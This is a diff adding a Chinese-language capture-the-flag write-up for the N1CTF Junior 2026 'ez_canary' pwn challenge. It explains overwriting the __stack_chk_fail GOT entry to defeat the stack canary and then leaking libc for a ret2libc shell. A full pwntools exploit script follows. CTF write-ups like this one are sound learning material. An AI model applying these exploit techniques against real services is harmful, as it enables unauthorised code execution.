@@ -385,6 +385,124 @@ sighandler_t signal(int signum, sighandler_t handler);
 
   但是我们这里rsp自减了8，也就是要在rsp-0x78处恢复一个值给rdi，但这里正是我们frame.r15处的地方，所以有一个错位，这里eflags设置为0x33是因为这样会恢复给寄存器cs，寄存器cs必须是0x33，否则内核马上会给段错误，而平时没有栈错位pwntools会自动给我们加一个frame.cs=0x33
 
+# ez_canary
+
+![file-20260227194205369](./N1CTF_Junior_2026_1_2_Pwn.assets/file-20260227194205369-1774336311952-1.png)
+
+分服务端和客户端，伪代码看着很复杂，但是很多都是用来处理服务端和客户端的连接的，实际上程序的逻辑很简单，客户端有五次连接到服务器的机会
+连接上服务器后，输入1会给一个200字节的读入，如果不是1，会给一个十六字节的读入写到现在的rbp处，也就是我们能控制rbp和返回地址
+我们第一次将返回地址改到read处，rbp改到got表处，将__stack_chk_fail函数的got表地址清空，这样就没有canary保护了，然后可以泄露libc基址
+之后我们再连接服务器一次，也是劫持__stack_chk_fail然后打ret2libc即可
+注意这里疑似要从inet_ntoa开始改，前三个疑似不能改，不然会报错
+
+这里注意如果调试崩溃了我们需要手动关闭占用7767端口的程序，用命令“sudo lsof -i :7767”查看当前程序的pid，然后用“sudo kill -9 pid”杀掉那个程序即可
+
+```python
+#!/usr/bin/env python3  
+  
+'''  
+    author: Weir_Su    time: 2026-03-09 20:57:34'''  
+from pwn import *  
+  
+filename = "client_patched"  
+libcname = "/home/weir-su/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/libc6_2.31-0ubuntu9.18_amd64/lib/x86_64-linux-gnu/libc.so.6"  
+host = "127.0.0.1"  
+port = 1337  
+container_id = ""  
+proc_name = ""  
+elf = context.binary = ELF("./client_patched")  
+if libcname:  
+    libc = ELF(libcname)  
+gs = '''  
+b main  
+set debug-file-directory /home/weir-su/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/libc6-dbg_2.31-0ubuntu9.18_amd64/usr/lib/debug  
+set directories /home/weir-su/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/glibc-source_2.31-0ubuntu9.18_all/usr/src/glibc/glibc-2.31  
+'''  
+  
+context.terminal = ["tmux", "splitw", "-l", "75%"]  
+  
+def start():  
+    if args.GDB:  
+        return gdb.debug(elf.path, gdbscript = gs)  
+    elif args.REMOTE:  
+        return remote(host, port)  
+    elif args.DOCKER:  
+        import docker  
+        from os import path  
+        p = remote(host, port)  
+        client = docker.from_env()  
+        container = client.containers.get(container_id=container_id)  
+        processes_info = container.top()  
+        titles = processes_info['Titles']  
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]  
+        target_proc = []  
+        for proc in processes:  
+            cmd = proc.get('CMD', '')  
+            exe_path = cmd.split()[0] if cmd else ''  
+            exe_name = path.basename(exe_path)  
+            if exe_name == proc_name:  
+                target_proc.append(proc)  
+        idx = 0  
+        if len(target_proc) > 1:  
+            for i, v in enumerate(target_proc):  
+                print(f"{i} => {v}")  
+            idx = int(input(f"Which one:"))  
+        import tempfile  
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:  
+            tmp.write(f'shell rm {tmp.name}\n{gs}')  
+        print(tmp.name)  
+        run_in_new_terminal(["sudo", "gdb", "-p", target_proc[idx]['PID'], "-x", tmp.name])  
+        return p  
+    else:  
+        return process(elf.path)  
+  
+p = start()  
+  
+#gdb.attach(p)  
+#pause()  
+# Your exploit here  
+  
+elf=ELF('./server_patched')  
+  
+pop_rdi=0x401893  
+got_addr=0x404070  
+read_addr=0x401451  
+new_rbp=0x404800  
+ret_addr=0x40101a  
+gift_addr=0x401436  
+_term_proc=0x4018B4  
+p.sendline(b'0')  
+payload1=p64(got_addr)+p64(read_addr)  
+p.sendafter(b'This is canary!',payload1)  
+sleep(0.1)  
+payload2=p64(_term_proc)*8+p64(new_rbp)+p64(read_addr)  
+p.send(payload2)  
+pause()  
+payload3=p64(0)*9+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])  
+p.send(payload3)  
+p.recvuntil(b'[Server]: ')  
+libc_addr=int.from_bytes(p.recv(6), byteorder='little')-libc.symbols['puts']  
+success(hex(libc_addr))  
+p.close()  
+if args.REMOTE:  
+    p=remote(host,port)  
+else:  
+    p=process('./client_patched')  
+pause()  
+p.sendline(b'0')  
+payload1=p64(got_addr)+p64(read_addr)  
+p.sendafter(b'This is canary!',payload1)  
+sleep(0.1)  
+payload2=p64(_term_proc)*8+p64(new_rbp)+p64(read_addr)  
+p.send(payload2)  
+pause()  
+system_addr=libc_addr+libc.symbols['system']  
+binsh_addr=libc_addr+next(libc.search(b"/bin/sh\x00"))  
+payload3=p64(0)*9+p64(ret_addr)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)  
+p.send(payload3)  
+p.interactive()
+```
+
 
   参考资料 / Reference：
   - [ItsFlicker - N1CTF Junior 2026 1/2 Pwn 全题解](https://blog.mcitd.cn/posts/n1ctf-junior-2026-1/wp/)
